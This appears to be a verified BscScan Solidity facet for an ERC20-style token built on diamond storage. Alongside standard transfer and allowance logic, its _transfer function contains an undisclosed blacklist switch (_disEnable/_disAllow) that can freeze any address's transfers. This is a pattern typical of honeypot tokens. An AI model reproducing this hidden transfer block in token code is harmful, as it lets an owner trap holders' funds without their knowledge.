/**
 *Submitted for verification at BscScan.com on 2022-05-18
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "./TestLib.sol";
contract nameFacet is IERC20, IERC20Metadata, Context {
    modifier onlyOwner() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            ds._owner == _msgSender(),
            "Ownable: caller is not the ow  ner"
        );
        _;
    }

    function name() public view virtual override returns (string memory) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._name;
    }
    function symbol() public view virtual override returns (string memory) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._totalSupply;
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owners,
        address spender
    ) public view virtual override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owners][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = ds._allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }
    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._disEnable) {
            require(ds._disAllow[sender] == false);
            require(ds._disAllow[recipient] == false);
        }

        uint256 senderBalance = ds._balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        ds._balances[sender] -= amount;
        ds._balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
    function _approve(
        address owners,
        address spender,
        uint256 amount
    ) internal virtual {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._allowances[owners][spender] = amount;
        emit Approval(owners, spender, amount);
    }
}
